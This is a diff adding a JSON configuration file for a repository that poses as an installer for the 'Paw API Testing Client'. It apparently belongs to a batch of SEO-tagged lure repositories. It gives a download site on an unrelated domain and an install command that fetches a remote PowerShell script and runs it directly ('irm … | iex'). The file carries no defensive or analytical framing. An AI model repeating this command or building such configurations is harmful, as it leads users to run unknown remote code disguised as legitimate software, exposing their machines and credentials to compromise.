@@ -1,0 +1,29 @@
+{
+  "repo": "paw-api-testing-client",
+  "product": "Paw API Testing Client",
+  "kind": "api",
+  "install_type": "download",
+  "download_url": "https://paw.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "api",
+  "topics": [
+    "paw-pro",
+    "paw-software",
+    "paw-api-testing",
+    "paw-on-windows",
+    "paw-not-working-fix",
+    "setup-paw-windows",
+    "paw-rest-api-client",
+    "paw-desktop-app",
+    "paw-configuration-guide",
+    "paw-config-2026",
+    "paw-latest",
+    "desktop-tools",
+    "setup-guide",
+    "dev-tools",
+    "pc-utility"
+  ]
+}
